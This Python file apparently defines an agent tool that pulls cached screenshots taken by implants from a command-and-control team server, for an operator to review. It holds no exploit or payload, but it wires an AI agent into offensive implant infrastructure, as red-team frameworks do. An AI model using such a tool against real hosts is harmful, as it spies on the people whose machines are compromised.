from logic.core import server
from logic import team_http

@server.tool(
    name="alice_screenshot_get",
    description=(
        "Returns a cached implant screenshot via GET /api/screenshot/{tag}. "
        "Response content is base64 JPEG or the literal string empty."
    ),
    annotations={"readOnlyHint": True, "destructiveHint": False, "openWorldHint": True},
)
def alice_screenshot_get(
    host_tag,
    content_hash="",
    long_polling=False,
):
    # Pulls the latest screenshot snapshot for operator review
    raw = str(host_tag or "").strip()

    if not raw:
        raise ValueError("host_tag is required")

    tag = team_http.validate_host_tag(raw)
    params = {}
    digest = str(content_hash or "").strip()

    if digest:
        params["hash"] = digest

    if long_polling:
        params["longPolling"] = "true"

    path = f"/api/screenshot/{team_http.quote_path_segment(tag)}"
    payload = team_http.team_request("GET", path, params=params)

    if not isinstance(payload, dict):
        raise RuntimeError("unexpected screenshot response")

    status = str(payload.get("status", "")).strip().lower()

    if status == "failure":
        message = str(payload.get("message", "screenshot get failed"))
        raise RuntimeError(message)

    if status and status != "success":
        raise RuntimeError(f"unexpected screenshot status: {status}")

    return team_http.format_team_response(payload)